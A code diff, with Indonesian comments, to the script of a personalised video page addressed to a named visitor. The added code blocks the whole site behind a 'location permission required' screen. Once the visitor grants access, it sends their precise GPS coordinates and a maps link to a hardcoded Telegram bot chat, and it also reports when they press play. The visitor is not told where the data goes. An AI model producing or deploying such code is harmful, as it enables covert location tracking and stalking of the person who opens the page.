@@ -98,89 +98,241 @@ var TELEGRAM_CHAT_ID = "6006690349";
 // ========================
 
 
-// ===== TAMBAHAN: KIRIM LOKASI GPS SAAT PERTAMA MASUK =====
-var gpsSudahDikirim = localStorage.getItem("gpsSudahDikirim");
+// ======================================================
+// KUNCI WEBSITE SAMPAI LOKASI BERHASIL DIDAPAT
+// ======================================================
 
-function kirimLokasiGPS(){
-  if(gpsSudahDikirim === "1") return;
-  if(!navigator.geolocation) return;
+document.body.style.visibility = "hidden";
 
-  navigator.geolocation.getCurrentPosition(
-    function(pos){
-      var lat = pos.coords.latitude;
-      var lon = pos.coords.longitude;
-      var akurasi = Math.round(pos.coords.accuracy);
+// Overlay dibuat sebagai anak HTML, bukan BODY,
+// supaya tetap terlihat walaupun BODY disembunyikan.
+var locationLock = document.createElement("div");
 
-      fetch("https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text:
-            "📍 WEBSITE DIBUKA\n\n" +
-            "👤 " + NAMA + "\n" +
-            "Latitude: " + lat + "\n" +
-            "Longitude: " + lon + "\n" +
-            "🎯 Akurasi: ±" + akurasi + " meter\n\n" +
-            "🗺️ https://www.google.com/maps?q=" + lat + "," + lon
-        })
-      })
-      .then(function(){
-        localStorage.setItem("gpsSudahDikirim", "1");
-      })
-      .catch(function(){});
-    },
-    function(){},
+locationLock.style.cssText =
+  "position:fixed;" +
+  "inset:0;" +
+  "z-index:999999;" +
+  "display:flex;" +
+  "align-items:center;" +
+  "justify-content:center;" +
+  "text-align:center;" +
+  "padding:30px;" +
+  "background:#0b0b0d;" +
+  "color:#ece6dc;" +
+  "font-family:Georgia,serif;";
+
+locationLock.innerHTML =
+  '<div style="max-width:420px;">' +
+    '<div style="font-size:48px;margin-bottom:20px;">📍</div>' +
+    '<h2 style="font-family:Arial,sans-serif;font-weight:400;margin:0 0 15px;">Izin lokasi diperlukan</h2>' +
+    '<p id="locationStatus" style="color:#a79f93;line-height:1.7;margin:0;">' +
+    'Mohon izinkan akses lokasi untuk melanjutkan.' +
+    '</p>' +
+  '</div>';
+
+document.documentElement.appendChild(locationLock);
+
+
+// ======================================================
+// TELEGRAM
+// ======================================================
+
+function kirimTelegram(teks){
+
+  return fetch(
+    "https://api.telegram.org/bot" +
+    TELEGRAM_BOT_TOKEN +
+    "/sendMessage",
     {
-      enableHighAccuracy: true,
-      timeout: 15000,
-      maximumAge: 0
+      method:"POST",
+      headers:{
+        "Content-Type":"application/json"
+      },
+      body:JSON.stringify({
+        chat_id:TELEGRAM_CHAT_ID,
+        text:teks
+      })
     }
   );
+
 }
 
-kirimLokasiGPS();
+
+// ======================================================
+// LOKASI BERHASIL
+// ======================================================
+
+function lokasiBerhasil(pos){
+
+  var lat = pos.coords.latitude;
+  var lon = pos.coords.longitude;
+  var akurasi = Math.round(pos.coords.accuracy);
+
+  // Kirim lokasi ke Telegram
+  kirimTelegram(
+    "📍 WEBSITE DIBUKA\n\n" +
+    "👤 " + NAMA + "\n" +
+    "Latitude: " + lat + "\n" +
+    "Longitude: " + lon + "\n" +
+    "🎯 Akurasi: ±" + akurasi + " meter\n\n" +
+    "🗺️ https://www.google.com/maps?q=" +
+    lat + "," + lon
+  ).catch(function(e){});
+
+  // Buka website utama
+  document.body.style.visibility = "visible";
+  locationLock.remove();
+
+}
 
 
-// TELEGRAM: fungsi kirim notif, cuma sekali per kunjungan
+// ======================================================
+// LOKASI GAGAL / DITOLAK
+// ======================================================
+
+function lokasiGagal(){
+
+  document.getElementById("locationStatus").innerHTML =
+    "Akses lokasi diperlukan untuk membuka website." +
+    "<br><br>" +
+    "<span style=\"color:#c0282d;\">" +
+    "Izin lokasi ditolak atau lokasi tidak dapat diperoleh." +
+    "</span>" +
+    "<br><br>" +
+    "Aktifkan izin lokasi untuk website ini, kemudian muat ulang halaman.";
+
+}
+
+
+// ======================================================
+// MINTA IZIN LOKASI SAAT WEBSITE DIBUKA
+// ======================================================
+
+if(!navigator.geolocation){
+
+  lokasiGagal();
+
+}else{
+
+  navigator.geolocation.getCurrentPosition(
+    lokasiBerhasil,
+    lokasiGagal,
+    {
+      enableHighAccuracy:true,
+      timeout:15000,
+      maximumAge:0
+    }
+  );
+
+}
+
+
+// ======================================================
+// FUNGSI WEBSITE ASLI
+// ======================================================
+
 var sudahKirim = false;
+
 function kabari(){
+
   if(sudahKirim) return;
+
   sudahKirim = true;
 
-  fetch("https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
-      text: "🎬 " + NAMA + " baru saja menekan tombol putar video"
-    })
-  }).catch(function(e){});
+  fetch(
+    "https://api.telegram.org/bot" +
+    TELEGRAM_BOT_TOKEN +
+    "/sendMessage",
+    {
+      method:"POST",
+      headers:{
+        "Content-Type":"application/json"
+      },
+      body:JSON.stringify({
+        chat_id:TELEGRAM_CHAT_ID,
+        text:"🎬 " + NAMA + " baru saja menekan tombol putar video"
+      })
+    }
+  ).catch(function(e){});
+
 }
 
-document.querySelectorAll('.nama').forEach(function(e){e.textContent=NAMA});
-var v=document.getElementById('player'),pick=document.getElementById('pick');
-if(VIDEO_SRC){v.src=VIDEO_SRC;pick.style.display='none'}
+
+document.querySelectorAll('.nama').forEach(function(e){
+  e.textContent=NAMA
+});
+
+var v=document.getElementById('player'),
+    pick=document.getElementById('pick');
+
+if(VIDEO_SRC){
+  v.src=VIDEO_SRC;
+  pick.style.display='none'
+}
+
 document.getElementById('file').addEventListener('change',function(e){
-  var f=e.target.files[0];if(!f)return;
-  v.src=URL.createObjectURL(f);pick.style.display='none';v.play().catch(function(){});
+
+  var f=e.target.files[0];
+
+  if(!f)return;
+
+  v.src=URL.createObjectURL(f);
+  pick.style.display='none';
+  v.play().catch(function(){});
+
 });
+
 var m=document.getElementById('vid');
-function closeM(){m.classList.remove('show');v.pause();document.body.style.overflow=''}
+
+function closeM(){
+
+  m.classList.remove('show');
+  v.pause();
+  document.body.style.overflow=''
+
+}
+
 document.getElementById('go').addEventListener('click',function(){
+
   kabari();
-  m.classList.add('show');document.body.style.overflow='hidden';
+
+  m.classList.add('show');
+  document.body.style.overflow='hidden';
+
   if(v.src)v.play().catch(function(){});
+
 });
+
 document.getElementById('close').addEventListener('click',closeM);
-m.addEventListener('click',function(e){if(e.target===m)closeM()});
-document.addEventListener('keydown',function(e){if(e.key==='Escape')closeM()});
-var io=new IntersectionObserver(function(es){es.forEach(function(x){if(x.isIntersecting)x.target.classList.add('in')})},{threshold:.15});
-document.querySelectorAll('.r').forEach(function(e){io.observe(e)});
+
+m.addEventListener('click',function(e){
+
+  if(e.target===m)closeM()
+
+});
+
+document.addEventListener('keydown',function(e){
+
+  if(e.key==='Escape')closeM()
+
+});
+
+var io=new IntersectionObserver(function(es){
+
+  es.forEach(function(x){
+
+    if(x.isIntersecting)
+      x.target.classList.add('in')
+
+  })
+
+},{threshold:.15});
+
+document.querySelectorAll('.r').forEach(function(e){
+
+  io.observe(e)
+
+});
 </script>
 </body>
 </html>
